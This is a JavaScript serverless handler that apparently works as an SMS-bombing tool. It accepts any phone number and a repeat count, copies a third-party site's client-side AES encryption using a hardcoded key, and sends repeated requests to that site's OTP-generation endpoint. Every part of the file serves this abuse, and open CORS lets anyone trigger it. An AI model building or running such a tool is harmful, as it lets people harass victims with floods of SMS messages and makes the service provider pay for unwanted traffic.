const crypto = require('crypto');

// AES-128-CBC encryption
class OTPEncryptor {
    constructor() {
        this.key = Buffer.from('1234567890abcdef', 'utf8');
    }

    encryptPhoneNumber(phoneNumber) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-128-cbc', this.key, iv);
        let encrypted = cipher.update(phoneNumber, 'utf8');
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        const combined = Buffer.concat([iv, encrypted]);
        return combined.toString('base64');
    }
}

// Send single OTP request (async, non-blocking)
async function sendOTP(phoneNumber, attempt) {
    const encryptor = new OTPEncryptor();
    const encryptedData = encryptor.encryptPhoneNumber(phoneNumber);
    
    const url = 'https://portallapp.com/api/v1/auth/generate-otp-web';
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({ data: encryptedData })
        });
        
        const result = await response.json();
        
        return {
            attempt: attempt,
            success: result.status === 'success',
            statusCode: response.status,
            response: result,
            timestamp: new Date().toISOString()
        };
    } catch (error) {
        return {
            attempt: attempt,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        };
    }
}

// Sleep function - non-blocking
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Main API Handler
export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Get parameters
    let number, count;
    
    if (req.method === 'POST') {
        ({ number, count } = req.body);
    } else {
        ({ number, count } = req.query);
    }

    // Validate number
    if (!number) {
        return res.status(400).json({
            success: false,
            error: 'Missing "number" parameter (10-digit phone number)'
        });
    }

    // Clean number
    let cleanNumber = number.replace(/[^0-9]/g, '');
    if (cleanNumber.startsWith('92')) {
        cleanNumber = cleanNumber.substring(2);
    }
    if (cleanNumber.startsWith('0')) {
        cleanNumber = cleanNumber.substring(1);
    }
    
    // Validate format
    if (!/^3\d{9}$/.test(cleanNumber)) {
        return res.status(400).json({
            success: false,
            error: 'Invalid number. Must be 10 digits starting with 3 (e.g., 3376313363)'
        });
    }

    // Count validation (max 10 to avoid timeout)
    let times = parseInt(count) || 1;
    if (times > 10) times = 10;
    if (times < 1) times = 1;

    const results = [];
    const startTime = Date.now();

    try {
        // Send first request immediately (no delay)
        results.push(await sendOTP(cleanNumber, 1));

        // Send remaining requests with 5-second delay (non-blocking)
        for (let i = 2; i <= times; i++) {
            // Non-blocking sleep - No CPU usage
            await sleep(5000);
            results.push(await sendOTP(cleanNumber, i));
        }

        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);

        // Return success response
        return res.status(200).json({
            success: true,
            number: cleanNumber,
            totalAttempts: times,
            totalTime: `${totalTime}s`,
            results: results,
            summary: {
                successful: results.filter(r => r.success).length,
                failed: results.filter(r => !r.success).length
            }
        });

    } catch (error) {
        // Handle any unexpected errors
        return res.status(500).json({
            success: false,
            error: error.message,
            results: results
        });
    }
}
